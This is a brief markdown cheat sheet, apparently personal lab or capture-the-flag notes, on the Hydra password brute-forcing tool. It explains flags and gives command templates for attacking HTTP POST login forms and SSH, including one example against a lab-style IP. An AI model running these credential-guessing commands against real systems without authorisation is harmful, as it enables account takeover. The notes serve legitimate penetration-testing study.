# Args
## -l
specifies the username
## -P
indicates the password list
## -t
sets the number of threads to spawn
## -V
sets the output to verbose
## -s
sets the port
# Usage
## General usage
```
hydra -l <username> -P <wordlist> <IP> -t <threads> <protocol>
```
## HTTP POST FORM
```shell
sudo hydra -l <username> -P <wordlist> <IP> http-post-form "<path>:<login_credentials>:<invalid_response>"
```
example:
```shell
hydra -l <username> -P <wordlist> 10.10.88.56 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
## SSH
```shell
hydra -l <username> -P <wordlist> ssh://<ip> -t <threads> -vV
```

# TIPS
make sure to use full error message